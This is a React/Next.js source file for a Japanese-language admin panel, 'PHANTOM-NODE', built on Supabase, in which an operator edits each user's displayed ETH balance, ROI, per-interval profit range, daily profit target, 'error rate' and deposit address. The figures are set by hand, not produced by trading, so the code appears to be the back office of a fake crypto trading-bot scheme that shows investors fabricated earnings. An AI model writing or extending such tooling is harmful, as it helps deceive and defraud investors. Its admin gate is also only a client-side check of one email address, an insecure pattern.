// ==========================================
// 🔴 1. IMPORTS
// ==========================================
"use client";
import React, { useState, useEffect } from 'react';
import { supabase } from '../../lib/supabase';

type UserConfig = {
  id: string;
  user_id: string;
  user_email: string;
  user_name: string;
  phone_number: string;
  target_roi: number;
  eth_balance: number;
  deposit_address: string;
  admin_remarks: string;
  error_rate: number;
  bot_mode: string;
  cron_interval_seconds: number;
  profit_min_usd: number;
  profit_max_usd: number;
  daily_target_profit: number | null;
  created_at: string;
  updated_at: string;
};

// ==========================================
// 🟢 2. 管理画面本体
// ==========================================
export default function AdminPortal() {
  const [session, setSession] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [configs, setConfigs] = useState<UserConfig[]>([]);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [dbError, setDbError] = useState<string | null>(null);

  const [formName, setFormName] = useState('');
  const [formPhone, setFormPhone] = useState('');
  const [formRoi, setFormRoi] = useState(1.5);
  const [formBalance, setFormBalance] = useState(2.145);
  const [formAddress, setFormAddress] = useState('');
  const [formRemarks, setFormRemarks] = useState('');
  const [formErrorRate, setFormErrorRate] = useState(0.2);
  const [formBotMode, setFormBotMode] = useState('AUTO');
  const [formInterval, setFormInterval] = useState(60);
  const [formProfitMin, setFormProfitMin] = useState(0.5);
  const [formProfitMax, setFormProfitMax] = useState(18.5);
  const [formDailyTarget, setFormDailyTarget] = useState<number | null>(null);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session);
      setLoading(false);
    });
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
    });
    return () => subscription.unsubscribe();
  }, []);

  const fetchConfigs = async () => {
    setDbError(null);
    const { data, error } = await supabase
      .from('bot_configs')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (error) {
      setDbError(`[DBエラー]: ${error.message} (コード: ${error.code})`);
      console.error(error);
    } else if (data) {
      setConfigs(data as UserConfig[]);
    }
  };

  useEffect(() => {
    if (session && session.user.email === 'admin@node.local') {
      fetchConfigs();
    }
  }, [session]);

  const startEdit = (conf: UserConfig) => {
    setEditingId(conf.id);
    setFormName(conf.user_name || '');
    setFormPhone(conf.phone_number || '');
    setFormRoi(conf.target_roi);
    setFormBalance(conf.eth_balance);
    setFormAddress(conf.deposit_address);
    setFormRemarks(conf.admin_remarks || '');
    setFormErrorRate(conf.error_rate || 0.2);
    setFormBotMode(conf.bot_mode || 'AUTO');
    setFormInterval(conf.cron_interval_seconds || 60);
    setFormProfitMin(conf.profit_min_usd || 1.5);
    setFormProfitMax(conf.profit_max_usd || 18.5);
    setFormDailyTarget(conf.daily_target_profit ?? null);
  };

  const saveConfig = async (id: string) => {
    setDbError(null);
    const { error } = await supabase
      .from('bot_configs')
      .update({
        user_name: formName,
        phone_number: formPhone,
        target_roi: formRoi,
        eth_balance: formBalance,
        deposit_address: formAddress,
        admin_remarks: formRemarks,
        error_rate: formErrorRate,
        bot_mode: formBotMode,
        cron_interval_seconds: formInterval,
        profit_min_usd: formProfitMin,
        profit_max_usd: formProfitMax,
        daily_target_profit: formDailyTarget,
        updated_at: new Date().toISOString()
      })
      .eq('id', id);

    if (!error) {
      setEditingId(null);
      fetchConfigs();
    } else {
      setDbError(`[保存エラー]: ${error.message}`);
    }
  };

  if (loading) {
    return <div className="min-h-screen bg-black text-cyan-400 font-mono flex items-center justify-center">セキュリティ確認中...</div>;
  }

  if (!session || session.user.email !== 'admin@node.local') {
    return (
      <div className="min-h-screen bg-black text-red-500 font-mono flex flex-col items-center justify-center p-4">
        <h1 className="text-3xl font-bold tracking-widest mb-4">🚨 アクセス拒否</h1>
        <p className="text-xs text-gray-500 font-bold">権限なし: {session?.user?.email || 'N/A'}</p>
        <button onClick={() => window.location.href = '/'} className="mt-8 border border-red-500 text-red-500 px-4 py-2 hover:bg-red-500/10 text-xs">
          メイン画面に戻る
        </button>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-cyan-400 font-mono p-4 md:p-8">
      
      <header className="border-b border-cyan-500/30 pb-4 mb-8 flex justify-between items-end">
        <div>
          <h1 className="text-xl md:text-2xl font-bold tracking-widest text-cyan-400 drop-shadow-[0_0_8px_rgba(0,243,255,0.6)]">
            PHANTOM-NODE // 管理画面
          </h1>
          <p className="text-xs text-gray-400 mt-1">管理者: {session.user.email} 🟢 マスターキー有効</p>
        </div>
        <button onClick={() => supabase.auth.signOut()} className="border border-red-900 bg-red-900/10 text-red-500 px-3 py-1.5 rounded text-xs hover:bg-red-900/30">
          ログアウト
        </button>
      </header>

      {dbError && (
        <div className="mb-6 p-4 border border-red-500 bg-red-950/20 text-red-400 rounded text-xs space-y-1">
          <p className="font-bold">⚠️ システムアラート:</p>
          <p className="font-mono">{dbError}</p>
          <button onClick={fetchConfigs} className="mt-2 text-cyan-400 underline block">再接続</button>
        </div>
      )}

      <div className="bg-[#0a0a0a] border border-cyan-500/20 rounded overflow-hidden">
        <div className="p-4 bg-[#111] border-b border-cyan-500/20 font-bold text-sm flex justify-between">
          <span>ユーザー管理一覧</span>
          <span className="text-xs text-gray-500">リアルタイム同期中</span>
        </div>

        <div className="overflow-x-auto">
          {configs.length === 0 && !dbError ? (
            <div className="p-8 text-center text-gray-600 text-xs">[ 登録ユーザーが見つかりません ]</div>
          ) : (
            <table className="w-full text-left text-xs min-w-[1800px]">
              <thead className="bg-black text-gray-500 border-b border-gray-800">
                <tr>
                  <th className="p-3">登録日時</th>
                  <th className="p-3">名前 / 連絡先</th>
                  <th className="p-3">モード</th>
                  <th className="p-3">利益率</th>
                  <th className="p-3">エラー率</th>
                  <th className="p-3">間隔</th>
                  <th className="p-3">利益範囲</th>
                  <th className="p-3">1日目標</th>
                  <th className="p-3">残高</th>
                  <th className="p-3">アドレス</th>
                  <th className="p-3">備考</th>
                  <th className="p-3 text-center">操作</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-800">
                {configs.map((conf) => (
                  <tr key={conf.id} className="hover:bg-cyan-500/5 transition-colors">
                    <td className="p-3 text-gray-500 font-mono">
                      {new Date(conf.created_at).toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' })}
                    </td>
                    <td className="p-3">
                      <div>
                        <p className="text-white font-bold text-sm">{conf.user_name || '未設定'}</p>
                        <p className="text-[#00ff00] font-mono text-[11px]">{conf.phone_number || 'TEL: -'}</p>
                        <p className="text-gray-500 text-[10px]">{conf.user_email}</p>
                      </div>
                    </td>
                    <td className="p-3">
                      {editingId === conf.id ? (
                        <select value={formBotMode} onChange={(e) => setFormBotMode(e.target.value)} className="w-20 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-xs">
                          <option value="AUTO">AUTO</option>
                          <option value="TURBO">TURBO</option>
                          <option value="OFF">OFF</option>
                        </select>
                      ) : (
                        <span className={`font-bold text-xs px-1.5 py-0.5 rounded ${conf.bot_mode === 'AUTO' ? 'text-green-400 bg-green-900/20' : conf.bot_mode === 'TURBO' ? 'text-orange-400 bg-orange-900/20' : 'text-red-400 bg-red-900/20'}`}>
                          {conf.bot_mode === 'AUTO' ? '自動' : conf.bot_mode === 'TURBO' ? '高速' : '停止'}
                        </span>
                      )}
                    </td>
                    <td className="p-3 font-mono">
                      {editingId === conf.id ? (
                        <div className="flex items-center gap-1">
                          <input type="number" step="0.1" value={formRoi} onChange={(e) => setFormRoi(parseFloat(e.target.value))} className="w-16 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-center" />
                          <span>%</span>
                        </div>
                      ) : (
                        <span className={`font-bold ${conf.target_roi >= 0 ? 'text-[#00ff00]' : 'text-red-500'}`}>
                          {conf.target_roi >= 0 ? `+${conf.target_roi}%` : `${conf.target_roi}%`}
                        </span>
                      )}
                    </td>
                    <td className="p-3 font-mono">
                      {editingId === conf.id ? (
                        <div className="flex items-center gap-1">
                          <input type="number" step="0.05" min="0" max="1" value={formErrorRate} onChange={(e) => setFormErrorRate(parseFloat(e.target.value))} className="w-14 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-center" />
                          <span className="text-gray-500 text-[10px]">(0〜1)</span>
                        </div>
                      ) : (
                        <span className="text-yellow-400 font-bold">{(conf.error_rate * 100).toFixed(0)}%</span>
                      )}
                    </td>
                    <td className="p-3 font-mono">
                      {editingId === conf.id ? (
                        <div className="flex items-center gap-1">
                          <input type="number" min="5" value={formInterval} onChange={(e) => setFormInterval(parseInt(e.target.value))} className="w-14 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-center" />
                          <span className="text-gray-500 text-[10px]">秒</span>
                        </div>
                      ) : (
                        <span className="text-cyan-400 font-bold">{conf.cron_interval_seconds || 60}秒</span>
                      )}
                    </td>
                    <td className="p-3 font-mono">
                      {editingId === conf.id ? (
                        <div className="flex items-center gap-1">
                          <span className="text-gray-500">$</span>
                          <input type="number" step="0.5" value={formProfitMin} onChange={(e) => setFormProfitMin(parseFloat(e.target.value))} className="w-14 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-center" />
                          <span className="text-gray-500">〜</span>
                          <input type="number" step="0.5" value={formProfitMax} onChange={(e) => setFormProfitMax(parseFloat(e.target.value))} className="w-14 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-center" />
                        </div>
                      ) : (
                        <span className="text-white">${conf.profit_min_usd || 1.5}〜${conf.profit_max_usd || 18.5}</span>
                      )}
                    </td>
                    <td className="p-3 font-mono">
                      {editingId === conf.id ? (
                        <div className="flex items-center gap-1">
                          <span className="text-gray-500">$</span>
                          <input type="number" step="10" value={formDailyTarget ?? ''} onChange={(e) => setFormDailyTarget(e.target.value ? parseFloat(e.target.value) : null)} placeholder="未設定" className="w-16 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-center" />
                        </div>
                      ) : (
                        <span className={conf.daily_target_profit ? 'text-[#00ff00] font-bold' : 'text-gray-600'}>
                          {conf.daily_target_profit ? `$${conf.daily_target_profit}` : '未設定'}
                        </span>
                      )}
                    </td>
                    <td className="p-3 font-mono">
                      {editingId === conf.id ? (
                        <div className="flex items-center gap-1">
                          <input type="number" step="0.001" value={formBalance} onChange={(e) => setFormBalance(parseFloat(e.target.value))} className="w-20 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-center" />
                          <span>ETH</span>
                        </div>
                      ) : (
                        <span className="text-white font-bold text-sm">{conf.eth_balance.toFixed(3)} ETH</span>
                      )}
                    </td>
                    <td className="p-3 font-mono text-[10px]">
                      {editingId === conf.id ? (
                        <input type="text" value={formAddress} onChange={(e) => setFormAddress(e.target.value)} className="w-40 bg-black border border-cyan-500 text-cyan-400 p-1 rounded font-mono text-[10px]" />
                      ) : (
                        <span className="text-gray-400 block w-32 truncate select-all" title={conf.deposit_address}>
                          {conf.deposit_address}
                        </span>
                      )}
                    </td>
                    <td className="p-3">
                      {editingId === conf.id ? (
                        <textarea value={formRemarks} onChange={(e) => setFormRemarks(e.target.value)} placeholder="メモ..." className="w-full h-12 bg-black border border-cyan-500 text-cyan-400 p-1 rounded text-xs resize-none" />
                      ) : (
                        <p className="text-yellow-500 text-[11px] italic max-w-[150px] break-words">
                          {conf.admin_remarks || '---'}
                        </p>
                      )}
                    </td>
                    <td className="p-3 text-center">
                      {editingId === conf.id ? (
                        <div className="flex justify-center gap-1.5">
                          <button onClick={() => saveConfig(conf.id)} className="bg-cyan-500/20 border border-cyan-500 text-cyan-400 px-3 py-1 rounded hover:bg-cyan-500/40 font-bold text-[10px]">保存</button>
                          <button onClick={() => setEditingId(null)} className="border border-gray-600 text-gray-400 px-2 py-1 rounded hover:bg-gray-800 text-[10px]">キャンセル</button>
                        </div>
                      ) : (
                        <button onClick={() => startEdit(conf)} className="border border-cyan-500/40 text-cyan-400 px-3 py-1.5 rounded hover:bg-cyan-500/10 font-bold text-[10px]">編集</button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>

    </div>
  );
}
// ==========================================
// 🛑 END OF FILE
// ==========================================
